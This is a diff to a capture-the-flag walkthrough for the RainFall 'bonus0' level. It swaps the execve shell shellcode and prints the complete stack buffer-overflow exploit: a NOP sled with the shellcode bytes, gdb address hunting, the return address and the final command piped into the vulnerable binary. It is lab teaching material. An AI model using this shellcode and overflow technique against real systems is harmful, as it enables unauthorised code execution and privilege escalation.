@@ -63,9 +63,9 @@ Let's see what our inputs should look like :
 ```
 
 ## Create our exploit
-*shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-827.php)*  
+*shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-827.php) (same as in level9)*  
 - 1st step : Create our first input with a padding of `NOP` instructions greater than 61 bytes and less than [4096 bytes - our shellcode]  
-	- 100 * NOP instruction + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80  
+	- 100 * NOP instruction + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80  
 - 2nd step : Find our buffer[4096] address in order to determine the address between the start of our buffer + 61 and the end of the NOP instructions.
 ```
 (gdb) set disassembly-flavor intel
@@ -87,10 +87,10 @@ Breakpoint 1, 0x080484d0 in p ()
 ```
 	- Choose an address between 0xbfffe680 + 61 (0xbfffe6bd) and 0xbfffe680 + 100 (0xbfffe6e4) => 0xbfffe6d0 (\xd0\xe6\xff\xbf)  
 - 3rd step : Final exploit  
-	- 1st arg = python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'  
+	- 1st arg = python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'  
 	- 2nd arg = python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'  
 ```
-bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
  - 
  - 
 AAAAAAAAABBBBBBB AAAAAAAAABBBBBBB
